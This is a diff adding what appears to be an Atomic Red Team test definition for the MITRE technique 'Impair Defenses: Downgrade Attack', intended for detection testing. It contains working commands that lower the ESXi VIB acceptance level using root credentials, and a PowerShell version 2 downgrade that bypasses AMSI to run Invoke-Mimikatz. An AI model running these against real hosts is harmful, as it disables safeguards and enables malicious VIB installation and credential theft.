@@ -1,0 +1,102 @@
+attack_technique: T1562.010
+display_name: 'Impair Defenses: Downgrade Attack'
+atomic_tests:
+- name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
+  auto_generated_guid: 062f92c9-28b1-4391-a5f8-9d8ca6852091
+  description: |
+    An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
+  supported_platforms:
+  - linux
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if VMWARE PowerCLI PowerShell Module is installed.
+    prereq_command: |
+      $RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
+      if (-not $RequiredModule) {exit 1}
+    get_prereq_command: |
+      Install-Module -Name VMware.PowerCLI -Confirm:$false
+  executor:
+    command: |
+      Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
+      Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
+      (Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"})
+      Disconnect-VIServer -Confirm:$false
+    name: powershell
+    elevation_required: true
+- name: ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI
+  auto_generated_guid: 14d55b96-b2f5-428d-8fed-49dc4d9dd616
+  description: |
+    An adversary will change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria via ESXCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)
+  supported_platforms:
+  - windows
+  input_arguments:
+    vm_host:
+      description: Specify the host name of the ESXi Server
+      type: string
+      default: atomic.local
+    vm_user:
+      description: Specify the privilege user account on ESXi Server
+      type: string
+      default: root
+    vm_pass:
+      description: Specify the privilege user password on ESXi Server
+      type: string
+      default: pass
+    plink_file:
+      description: Path to plink
+      type: path
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+    cli_script:
+      description: Path to script with commands to change acceptance level
+      type: path
+      default: PathToAtomicsFolder\T1562.010\src\esx_community_supported.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if plink is available.
+    prereq_command: |
+      if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
+  executor:
+    command: |
+       echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+    name: command_prompt
+- name: PowerShell Version 2 Downgrade
+  auto_generated_guid: 47c96489-2f55-4774-a6df-39faff428f6f
+  description: Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: Check if Version 2 is installed.
+    prereq_command: |
+      $v2_installed = PowerShell -version 2 -command '$PSVersionTable.PSVersion.Major'
+      if (-not $v2_installed) {exit 1} else {exit 0}
+    get_prereq_command: |
+      echo "Manually install PowerShell Version 2"
+  executor:
+    command: PowerShell -version 2 -command '#{v2_command}'
+    name: powershell
+    elevation_required: false
+  input_arguments:
+    v2_command:
+      description: Specify the command to execute with Version 2
+      type: string
+      default: Invoke-Mimikatz
